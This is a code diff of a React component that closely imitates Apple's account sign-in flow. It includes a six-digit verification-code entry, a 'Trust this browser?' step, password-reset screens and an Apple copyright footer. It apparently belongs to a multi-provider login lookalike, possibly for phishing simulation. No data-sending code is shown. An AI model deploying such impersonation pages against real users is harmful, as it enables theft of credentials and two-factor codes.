+                    if (v.length === 6) setTimeout(() => nav('device-trust'), 350);
+                  }}
+                  aria-label="Verification code"
+                  style={{ position:'absolute', inset:0, opacity:0, width:'100%', height:'100%', cursor:'text', caretColor:'transparent', fontSize:0 }}
+                />
+              </div>
 
-        {/* ── Forgot Apple Account / Password ── */}
-        {step === 'forgot' && (
-          <div className="flex flex-col items-center w-full">
-            <p className={`text-center text-[15px] leading-relaxed mb-8 ${subGray}`}>
-              Enter your Apple Account email address or phone number and we'll help you reset your password or find your account.
-            </p>
-            <div className={`w-full rounded-[13px] overflow-hidden border mb-5 ${groupBg}`}>
+              {codeError && <p style={{ fontSize:13, color:errClr, textAlign:'center', marginTop:8, marginBottom:0 }}>{codeError}</p>}
+
+              <div style={{ display:'flex', flexDirection:'column', alignItems:'center', gap:10, marginTop:16, marginBottom:0 }}>
+                <button data-testid="apple-resend-code" style={S.link}>Resend code to iPhone</button>
+                <button style={S.link}>Cannot access your iPhone?</button>
+              </div>
+
+              {LostDeviceSection}
+            </>
+          )}
+
+          {/* ── Trust this browser ── */}
+          {!isLoadingState && step === 'device-trust' && (
+            <>
+              {Ring}
+              <h1 style={{ fontSize:22, fontWeight:600, color:txtMain, textAlign:'center', margin:'0 0 12px' }}>
+                Trust this browser?
+              </h1>
+              <p style={{ fontSize:14, color:txtSub, textAlign:'center', margin:'0 0 24px', lineHeight:1.55, maxWidth:320 }}>
+                Should you choose to trust this browser, you will not be asked for a verification code the next time you sign in.
+              </p>
+
+              {/* Three buttons */}
+              <div style={{ display:'flex', gap:8, width:'100%', marginBottom:10 }}>
+                <button
+                  data-testid="apple-not-now"
+                  onClick={() => setStep('email')}
+                  style={{ ...S.outBtn(), flex:1, fontSize:15 }}
+                >
+                  Not Now
+                </button>
+                <button
+                  data-testid="apple-do-not-trust"
+                  onClick={() => nav('processing')}
+                  style={{ ...S.outBtn(), flex:1, fontSize:15 }}
+                >
+                  Do not trust
+                </button>
+                <button
+                  data-testid="apple-trust"
+                  onClick={() => nav('processing')}
+                  style={{ ...S.blueBtn(), flex:1, fontSize:15 }}
+                >
+                  Trust
+                </button>
+              </div>
+              <button style={{ ...S.link, fontSize:13, marginBottom:4 }}>Sign in to your Apple Account</button>
+
+              {LostDeviceSection}
+            </>
+          )}
+
+          {/* ── Forgot password ── */}
+          {!isLoadingState && step === 'forgot' && (
+            <>
+              {Ring}
+              <h1 style={{ fontSize:22, fontWeight:600, color:txtMain, textAlign:'center', margin:'0 0 14px' }}>Reset Password</h1>
+              <p style={{ fontSize:14, color:txtSub, textAlign:'center', margin:'0 0 20px', lineHeight:1.55 }}>
+                Enter your Apple Account email address and we'll help you reset your password.
+              </p>
               <input
                 type="email"
                 autoFocus
@@ -1560,64 +1613,51 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
                 onChange={e => setForgotEmail(e.target.value)}
                 onKeyDown={e => { if (e.key === 'Enter' && forgotEmail) setStep('forgot-sent'); }}
                 placeholder="Email or Phone Number"
-                className={`w-full px-4 py-3.5 text-[17px] focus:outline-none bg-transparent ${isDark ? 'text-white placeholder-[#636366]' : 'text-black placeholder-[#aeaeb2]'}`}
+                style={{ ...S.input(), marginBottom:14 }}
               />
-            </div>
-            <button
-              onClick={() => { if (forgotEmail) setStep('forgot-sent'); }}
-              disabled={!forgotEmail}
-              className={`w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-4 transition-opacity ${!forgotEmail ? 'opacity-40 cursor-not-allowed' : 'hover:opacity-90 active:opacity-80 cursor-pointer'}`}
-              style={{ backgroundColor: appleBlue }}
-            >
-              Continue
-            </button>
-            <button
-              onClick={() => setStep(password ? 'password' : 'email')}
-              className={`text-[15px] ${subGray} hover:text-[#007AFF] transition-colors`}
-              style={{ background: 'none', border: 'none', cursor: 'pointer' }}
-            >
-              Cancel
-            </button>
-          </div>
-        )}
+              <button
+                onClick={() => forgotEmail && setStep('forgot-sent')}
+                style={{ ...S.blueBtn(!forgotEmail), width:'100%', marginBottom:10 }}
+              >
+                Continue
+              </button>
+              <button onClick={() => setStep(password ? 'password' : 'email')} style={{ ...S.link, color:txtSub, fontSize:15 }}>
+                Cancel
+              </button>
+            </>
+          )}
 
-        {/* ── Forgot Sent Confirmation ── */}
-        {step === 'forgot-sent' && (
-          <div className="flex flex-col items-center w-full">
-            <div className={`w-16 h-16 rounded-full flex items-center justify-center mb-5 ${isDark ? 'bg-[#1c3553]' : 'bg-[#e8f4ff]'}`}>
-              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke={appleBlue} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                <rect x="2" y="4" width="20" height="16" rx="2"/>
-                <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/>
-              </svg>
-            </div>
-            <p className={`text-[17px] font-semibold text-center mb-3 ${isDark ? 'text-white' : 'text-black'}`}>
-              Check Your Email
-            </p>
-            <p className={`text-center text-[14px] leading-relaxed mb-7 ${subGray}`}>
-              If an Apple Account exists for <strong className={isDark ? 'text-white' : 'text-black'}>{forgotEmail}</strong>, we've sent password reset instructions to that address. Check your email.
-            </p>
-            <button
-              onClick={() => setStep('email')}
-              className="w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white transition-opacity hover:opacity-90 active:opacity-80"
-              style={{ backgroundColor: appleBlue }}
-            >
-              Return to Sign In
-            </button>
-            <p className={`text-[12px] text-center mt-5 leading-relaxed ${subGray}`}>
-              Didn't receive an email? Check your spam folder or{' '}
-              <button onClick={() => setStep('forgot')} className="underline" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer', fontSize: 'inherit' }}>
-                try a different address
-              </button>.
-            </p>
-          </div>
-        )}
+          {/* ── Forgot sent ── */}
+          {!isLoadingState && step === 'forgot-sent' && (
+            <>
+              <div style={{ width:60, height:60, borderRadius:'50%', backgroundColor: isDark ? '#1c3553' : '#e8f4ff', display:'flex', alignItems:'center', justifyContent:'center', marginBottom:20 }}>
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke={blue} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <rect x="2" y="4" width="20" height="16" rx="2"/>
+                  <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/>
+                </svg>
+              </div>
+              <h2 style={{ fontSize:20, fontWeight:600, color:txtMain, textAlign:'center', margin:'0 0 12px' }}>Check Your Email</h2>
+              <p style={{ fontSize:14, color:txtSub, textAlign:'center', lineHeight:1.55, margin:'0 0 24px' }}>
+                If an Apple Account exists for <strong style={{ color:txtMain }}>{forgotEmail}</strong>, we've sent password reset instructions to that address.
+              </p>
+              <button onClick={() => setStep('email')} style={{ ...S.blueBtn(), width:'100%' }}>Return to Sign In</button>
+            </>
+          )}
 
-        {/* Home indicator */}
-        {!isDesktop && (
-          <div className="absolute bottom-3 inset-x-0 flex justify-center">
-            <div className={`w-[134px] h-[5px] rounded-full ${isDark ? 'bg-white/40' : 'bg-black/20'}`} />
-          </div>
-        )}
+        </div>
+      </div>
+
+      {/* ── Footer ── */}
+      <div style={{ padding:'14px 24px', borderTop:`1px solid ${divBdr}`, display:'flex', justifyContent:'space-between', alignItems:'center', flexWrap:'wrap', gap:8 }}>
+        <div style={{ display:'flex', gap:0, alignItems:'center', flexWrap:'wrap' }}>
+          {(['System Status','Privacy Policy','Terms & Conditions'] as const).map((t, i) => (
+            <span key={t} style={{ display:'flex', alignItems:'center' }}>
+              {i > 0 && <span style={{ color: isDark ? '#636366' : '#aeaeb2', margin:'0 8px' }}>|</span>}
+              <button style={{ fontSize:12, color:txtSub, background:'none', border:'none', cursor:'pointer', fontFamily:ff, padding:0 }}>{t}</button>
+            </span>
+          ))}
+        </div>
+        <span style={{ fontSize:12, color:txtSub }}>Copyright © 2026 Apple Inc. All rights reserved.</span>
       </div>
     </div>
   );
